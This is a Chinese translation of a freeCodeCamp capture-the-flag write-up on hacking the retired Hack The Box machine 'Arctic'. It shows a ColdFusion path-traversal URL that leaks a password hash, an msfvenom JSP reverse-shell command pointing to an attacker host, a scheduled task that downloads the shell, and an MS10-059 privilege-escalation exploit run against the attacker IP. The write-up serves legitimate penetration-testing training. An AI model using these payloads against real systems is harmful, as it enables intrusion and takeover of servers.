# 保持冷静，黑掉盒子-北极

> 原文：<https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/>

黑客盒子(HTB)是一个在线平台，让你测试你的渗透测试技能。它包含几个不断更新的挑战。有些是模拟真实世界的场景，有些更倾向于 CTF 风格的挑战。

**注**。*只允许报道退役的 HTB 机器。*

![Screenshot-2020-01-28-at-21.06.12](img/8a65ad459aac2517c9b2f4903d488fe5.png)

Arctic 是一台初学者级别的机器，但是 web 服务器上的加载时间给开发带来了一些挑战。需要进行基本的故障排除，才能使正确的漏洞利用正常运行。

我们将使用以下工具将盒子典当在一个 [Kali Linux 盒子](https://www.kali.org/)上

*   nmap
*   Searchsploit
*   散列标识符
*   MSFvenom
*   网猫
*   GDS security/Windows-Exploit-Suggester
*   python http 服务器
*   powershell

## 第一步-侦察

开发一台机器的第一步是做一些扫描和侦察。

这是最重要的部分之一，因为它将决定你以后可以尝试利用什么。在这个阶段花更多的时间来获取尽可能多的信息总是更好的。

## 端口扫描

我将使用 Nmap(网络映射器)。Nmap 是一个用于网络发现和安全审计的免费开源工具。它使用原始 IP 数据包来确定网络上有哪些主机可用、这些主机提供什么服务、它们运行什么操作系统、使用什么类型的包过滤/防火墙以及许多其他特征。

这个工具有许多命令可以用来扫描网络。如果你想了解更多，你可以看一下文档[这里](https://tools.kali.org/information-gathering/nmap)。

![Screenshot-2020-01-28-at-21.50.12](img/99fff52dec03d44945a3feb93499813b.png)

我使用以下命令来执行密集扫描:

```
nmap -A -v 10.10.10.11
```

**-A:** 启用操作系统检测、版本检测、脚本扫描和跟踪路由

**-v:** 增加详细级别

**10.10.10.11:** 北极盒的 IP 地址

如果您发现结果有点太多，您可以执行另一个命令来只获取开放的端口。

```
nmap 10.10.10.11
```

![Screenshot-2020-01-28-at-21.51.47](img/18275f8e6b3496f26e6e0695d2d9dd66.png)

我们可以看到有 3 个开放的端口:

****港口** 135** 。Microsoft EPMAP(端点映射器)，也称为 DCE/RPC 定位器服务，用于远程管理包括 DHCP 服务器、DNS 服务器和 WINS 在内的服务

****港口** 8500** 。Adobe ColdFusion 内置 web 服务器

![Screenshot-2020-01-28-at-23.33.09](img/9c8c654a92294635d39a0cd9fecd2a13.png)

****港口** 49154** 。CMS 上的证书管理

目前，在端口 8500 上运行的 Adobe ColdFusion 将是主要目标。

## **步骤 2 -枚举**

我们试试**端口 8500** 访问 **http://10.10.10.11:8500**

![Screenshot-2020-01-28-at-22.13.37](img/1af21ab69ae9abd0d8369ecb180b0ea6.png)

我们可以看到两个文件夹。我打开文件夹。

![Screenshot-2020-01-28-at-22.25.16](img/384e536a51e72a96c8e53196f2c992d8.png)

它似乎是一个带有 ColdFusion 管理面板的 web 应用程序，地址如下:

```
10.10.10.11:8500/CFIDE/administrator/
```

有关 ColdFusion 的更多信息，请查看此处的。

![Screenshot-2020-01-28-at-22.26.22](img/badfbf6fd03bea0bff9462cee2682730.png)

我使用 **Searchsploit** 来检查 ColdFusion 上是否有任何已知的漏洞。Searchsploit 是一款针对 **[漏洞数据库](https://www.exploit-db.com/)的命令行搜索工具。**

![Screenshot-2020-01-28-at-22.45.47](img/792f528700f0cc6c498b560855443ded.png)

我使用以下命令:

```
searchsploit coldfusion
```

我们还可以在漏洞数据库网站上找到该漏洞:

![Screenshot-2020-01-28-at-23.01.42](img/f633359b6a867d6bb192d6a8e5c531fd.png)

[https://www.exploit-db.com/exploits/14641](https://www.exploit-db.com/exploits/14641)

我看了一下对漏洞利用的描述:

![Screenshot-2020-01-28-at-23.01.57](img/5e6bbe2c4a1f991e10c44e8a4f444f7c.png)

并将**服务器**位替换为 **10.10.10.11:8500**

```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

我可以看到散列密码现在出现在输入之间的页面上:

![Screenshot-2020-01-28-at-23.03.01](img/275d56f0a0ec1dce4405ede80d8e126e.png)

我使用**散列标识符**来标识可能的散列。hash-identifier 是一款软件，用于识别不同类型的用于加密数据尤其是密码的哈希。你可以在这里找到更多[的信息。](https://tools.kali.org/password-attacks/hash-identifier)

我用以下命令启动 hash-identifier:

```
hash-identifier
```

复制/粘贴我之前得到的散列密码:

![Screenshot-2020-01-28-at-23.28.06](img/a8c96898ca26bd635426ed1c9215fcc5.png)

我们看到散列最有可能是阿沙-1。

## 第三步-用 hashtoolkit.com 破解 SHA 1

我去网站 [hashtoolkit](http://hashtoolkit.com/) 去“解散列”。哈希函数的构建方式是很容易为文本生成哈希/指纹，但几乎不可能将哈希解码回原始文本。

值得注意的是，哈希是一种单向机制。因此，被散列的数据实际上不能被反转或“不散列”。

该网站正在使用**彩虹表**来逆转加密**哈希**函数，通常用于破解密码**哈希**。更多关于彩虹表的信息[点击这里](https://en.wikipedia.org/wiki/Rainbow_table)。

我复制/粘贴了哈希，找回了密码: **happyday。**

![Screenshot-2020-01-28-at-23.14.43](img/d545726e88bdc3b0eefa040cfa691138.png)

您还可以看到相同密码的不同哈希:

![Screenshot-2020-01-28-at-23.14.52](img/b253252001e4e9fb2ba7d07701c96b6c.png)

目前，该网站有近 170 亿个解密的 MD5 和 SHA1 密码哈希:

![Screenshot-2020-02-26-at-21.12.44](img/94523e57e29dd0dad82138b2f97b1160.png)

## 步骤 4 -创建计划任务

我使用密码登录门户网站:

![Screenshot-2020-02-17-at-22.27.41](img/f549133562a2c2fd349007508c1c3d9f.png)

我可以在左边栏看到一个区域，应该允许通过调试和日志类别下的计划任务上传:

![Screenshot-2020-02-17-at-22.28.57](img/4fade4dd72252ec343e5928e36a6eee5.png)

我可以创建一个新任务:

![Screenshot-2020-02-17-at-22.29.57](img/e66f128f0c03457c861a4c54e5b1929f.png)

在页面上，我必须用不同的参数设置任务:

![Screenshot-2020-02-17-at-22.31.03](img/6583dc875beae5f9404ac2189c0f27a4.png)

我检查了**映射**以查看 CFIDE 路径——我们在开始时找到的两个文件夹之一——并知道在哪里可以保存 shell:

![Screenshot-2020-02-17-at-22.33.22](img/3838f7713ba496e8203f57bbcc4585b6.png)

我将使用 **msfvenom** ，这是一个有效负载生成器，来精心设计这个漏洞——更具体地说是一个 **jsp** 反向外壳。这条信息是在侦察阶段收集的——查看 ColdFusion 的维基百科页面，我们可以看到它是用 Java 编写的:

![Screenshot-2020-02-26-at-21.25.07](img/7e7b1d3aebab4ce917b39240d5d25d7b.png)

你可以在这里了解更多关于 msfvenom [的信息。](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

![Screenshot-2020-02-17-at-22.45.53](img/914791044bc5266d6825b7ec0ce2f189.png)

我使用以下命令来创建有效负载:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f raw > arcticshell.jsp
```

****-** p **:**** 有效载荷使用

****-** f **:**** 输出格式

**LHOST**:**本地主机**

**LPORT**:**本地端口**

我把这个漏洞保存为**arcticshell.jsp**。我可以使用以下命令查看有效负载的内容:

```
cat arcticshell.jsp
```

![Screenshot-2020-02-17-at-22.45.39](img/91129b6a127924816c63e1c8809fa285.png)

让我们启动一个 Python 服务器来提供来自 Kali 的文件。我将使用**简单 HTTPServer** 。Python 附带的 SimpleHTTPServer 模块是一个简单的 HTTP 服务器，它提供标准的 GET 和 HEAD 请求处理程序。你可以在这里了解更多关于那个[的信息。](https://docs.python.org/2/library/simplehttpserver.html)

我使用以下命令创建一个简单的服务器:

```
python -m SimpleHTTPServer 80
```

![Screenshot-2020-02-17-at-22.51.00](img/1ac5817d65ee0ff8c73326fc90c1de74.png)

回到 ColdFusion 面板，我为计划任务配置了以下参数。

首先，我设置了我们的 web 服务器的 URL，该服务器托管我们用 msfvenom 创建的 shell:

```
http://10.10.14.51/arcticshell.jsp
```

然后，我选中复选框，将输出保存到文件中。

最后，我将文件设置为以下路径:

```
C:\ColdFusion8\wwwroot\CFIDE\arcticshell.jsp
```

以下是我完成所有参数设置后的结果:

![Screenshot-2020-02-25-at-22.01.14](img/68aee86ea5dceeedae4596e4163dc115.png)

在左侧的操作下，我单击第一个按钮来运行任务。我可以在页面顶部看到一条绿色消息，让我知道计划任务已成功完成:

![Screenshot-2020-02-25-at-21.58.56](img/0fd26e0bc6ecdc0923d4d1787bd46375.png)

我还可以在我的 python http 服务器上看到 200 响应:

![Screenshot-2020-02-25-at-21.59.43](img/2a14887fbe646f48f65756864ecdeccf.png)

我在端口 ****443**** 上设置了一个 ****Ncat**** 监听器来捕捉反向 shell 连接。

> Ncat 是一个功能丰富的网络实用程序，可以从命令行通过网络读写数据。Ncat 是为 Nmap 项目编写的，是古老的 [Netcat](http://sectools.org/tool/netcat/) 的改进版。它使用 TCP 和 UDP 进行通信，旨在成为一个可靠的后端工具，为其他应用程序和用户即时提供网络连接。

你可以在这里了解更多关于 Ncat [的信息。](https://nmap.org/book/ncat-man.html)

![Screenshot-2020-02-25-at-22.03.42](img/1dd3be9eeb992cb3c1a4b63f9239727e.png)

然后，我浏览到 shell，网址为:

```
http://10.10.10.11:8500/CFIDE/arcticshell.jsp
```

![Screenshot-2020-02-25-at-22.02.27](img/1c71e5609c752acfdd50225bb41d6519.png)

终于有壳了！

![Screenshot-2020-02-25-at-22.04.19](img/2549152d0c77c0fe935360454eebbcab.png)

## 步骤 5 -查找 user.txt 标志

我在机器上用命令检查我是谁

```
whoami
```

![Screenshot-2020-02-25-at-22.05.51](img/dd6eb40981a85fd5246152ecdb0c3d36.png)

我列出了文件/文件夹

```
dir
```

我导航到用户

![Screenshot-2020-02-25-at-22.06.27](img/75e308c9c467a71aef5ebb95032a4144.png)

然后我移动到 tolis 文件夹

![Screenshot-2020-02-25-at-22.06.44](img/399f6a486f06f60e87371970bb996a5c.png)

我导航到桌面

![Screenshot-2020-02-25-at-22.07.46](img/94783739051588915746866f13a0f03f.png)

而且我找到了 user.txt 文件！

![Screenshot-2020-02-25-at-22.08.02](img/edc0404dc05021080ad48a362ab32157.png)

为了读取文件的内容，我使用了以下命令

```
more user.txt
```

![Screenshot-2020-02-25-at-22.09.13](img/3f110ad6c8918dc0c36b6788771e5244.png)

## 步骤 6 - **使用**GDS security/**Windows-Exploit-Suggester**

我用命令查看系统信息

```
systeminfo
```

![Screenshot-2020-02-25-at-22.10.09](img/848e6f203fc742fb82e525e4d52f3d17.png)

我将调查结果复制/粘贴到一个 **systeminfo.txt** 文件中:

![Screenshot-2020-02-25-at-23.53.30](img/d44c94695109f4b5e8c35ec23999e5bd.png)

我将使用来自 [GDSSecurity](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 的 Windows-Exploit-Suggester:

> 该工具将目标修补程序级别与 Microsoft 漏洞数据库进行比较，以检测目标上潜在的缺失修补程序。它还会通知用户是否存在针对缺失公告的公开攻击和 Metasploit 模块。

> 它需要从 Windows 主机输出“systeminfo”命令，以便与 Microsoft 安全公告数据库进行比较，并确定主机的修补程序级别。

> 它能够使用- update 标志从 Microsoft 自动下载安全公告数据库，并将其保存为 Excel 电子表格。

我将原始的 windows-exploit-suggest python 脚本复制/粘贴到一个文件上，然后修改该文件

```
nano windows-exploit-suggester.py
```

粘贴来自 [GitHub 库](https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py)的代码。我们现在把两个文件放在同一个文件夹中， **systeminfo.txt** 和**windows-exploit-suggester . py:**

![Screenshot-2020-02-25-at-23.54.18](img/056beb64d05aff803a97c8cf7680fe68.png)

我可以使用以下命令找到关于该工具的更多信息:

```
python windows-exploit-suggester.py -h
```

![Screenshot-2019-10-08-at-21.45.56](img/c0956e00904cc5f816107a28b85ce658.png)

我使用以下命令更新工具的数据库:

```
python windows-exploit-suggester.py --update
```

![Screenshot-2020-02-25-at-23.55.08](img/ef4a13646f9ceaa22e64bc657381e5a6.png)

我用运行脚本

```
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2020-02-25-mssb.xls
```

如果遇到错误，您需要在安装 **xlrd** 之前安装 **pip** 。您可以使用以下命令在 Kali 上安装 pip:

```
apt install python-pip
```

![Screenshot-2020-02-25-at-23.56.14](img/acc25af5f15b7ed7967b1bc04cfef610.png)

然后，您可以使用以下命令安装 wlrd

```
pip install xlrd
```

![Screenshot-2020-02-25-at-23.56.59](img/e9dc3b669e7249034068540fd5019d8f.png)

我发现这台机器上有几份简历不见了。我将针对 **MS10-059** 漏洞:

![Screenshot-2020-02-25-at-23.57.09](img/e7a6de9285f60c84f749681e3eac1a87.png)

## 步骤 7 - **执行权限提升**

我访问微软网站，从他们的安全公告中获取更多信息:

![Screenshot-2020-02-26-at-21.46.50](img/64a7b371f198bbe8f148965c80819e36.png)

[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059)

我看了一下漏洞数据库:

![Screenshot-2020-02-25-at-23.15.45](img/db3c71c8fb5073677870f1a6b5e8f778.png)

[https://www.exploit-db.com/exploits/14610](https://www.exploit-db.com/exploits/14610)

我也看了一下国家漏洞数据库。更多关于 NVD 的信息请点击这里。

![Screenshot-2020-02-26-at-21.49.22](img/033fafc4babf8c12db4446bd5319c32a.png)

[https://nvd.nist.gov/vuln/detail/CVE-2010-2554](https://nvd.nist.gov/vuln/detail/CVE-2010-2554)

我在 GitHub [这里](https://github.com/Re4son/Chimichurri)找到一个可以下载的可执行文件。该漏洞将创建一个反向外壳。

我用创建了一个新的 python http 服务器

```
python -m SimpleHTTPServer 80
```

回到获取用户标志的 shell，我用漏洞的 URL 和保存漏洞的文件设置了一个 webclient:

![Screenshot-2020-02-25-at-23.58.22](img/2a916a0501d8fe7f83db930ac8478b7b.png)![Screenshot-2020-02-25-at-23.58.35](img/b2e037665dda6d4c3a03d22fe25de772.png)![Screenshot-2020-02-25-at-23.58.45](img/268821f7da7592b5088f23e302709120.png)![Screenshot-2020-02-25-at-23.58.53](img/d553d8222b05fa586e8b4cac25d40426.png)![Screenshot-2020-02-26-at-00.00.14](img/e0edd301c0f0c31a765c32c1470dbbb1.png)

我在 python http 服务器上得到一个 200:

![Screenshot-2020-02-26-at-00.01.37](img/6ed2a09ca9b289b75f4c065ab0d8184b.png)

我设置了一个新的 netcat，并使用以下命令启动漏洞利用:

```
exploit.exe 10.10.14.20 443
```

![Screenshot-2020-02-26-at-00.00.21](img/4169d3d180d3cbc28c5a87186eef02cf.png)![Screenshot-2020-02-26-at-00.00.30](img/25b344794e88ca53237b065a258114ce.png)

## 步骤 8 -查找 root.txt 标志

通过检查机器上的我是谁，我可以看到权限提升是成功的:

```
whoami
```

它回来了

```
nt authority\system
```

我是管理员:

![Screenshot-2020-02-26-at-00.02.50](img/d7b910eb64318c3e3ff986cfc66cd8d9.png)

我导航到用户:

![Screenshot-2020-02-26-at-00.03.47](img/bc6177f081cbb0b4de1d565441cbaff5.png)

我移至管理员文件夹:

![Screenshot-2020-02-26-at-00.03.58](img/86f1f9ba3b0017eb7dc8d4caa56314ea.png)

我导航到桌面文件夹:

![Screenshot-2020-02-26-at-00.04.20](img/ddfd31aa81dfa2e3da62b9d4719e107e.png)

我能看到 root.txt 标志！

![Screenshot-2020-02-26-at-00.04.29](img/3b7718930968468596e0f518c101a926.png)

我使用下面的命令来查看文件的内容:

```
more root.txt
```

![Screenshot-2020-02-26-at-00.04.39](img/99513be593712793025ea9973dcdcd68.png)

恭喜你。你找到了两面旗子！

请随时评论、提问或与朋友分享:)

你可以在这里看到更多我的文章

你可以在推特上关注我，也可以在 T2 的 LinkedIn 上关注我

别忘了# **GetSecure** ，# **BeSecure** ，# **StaySecure** ！

****其他黑盒子文章****

*   [保持冷静，黑掉瘸子](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
*   [保持冷静，黑掉盒子——遗产](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
*   保持冷静，黑掉盒子
*   [保持冷静，黑盒子——哔](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
*   [保持冷静，黑盒子——最佳](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)

![8hAf8sI-1](img/e00b896c2ff03fa3569ca87656b5149b.png)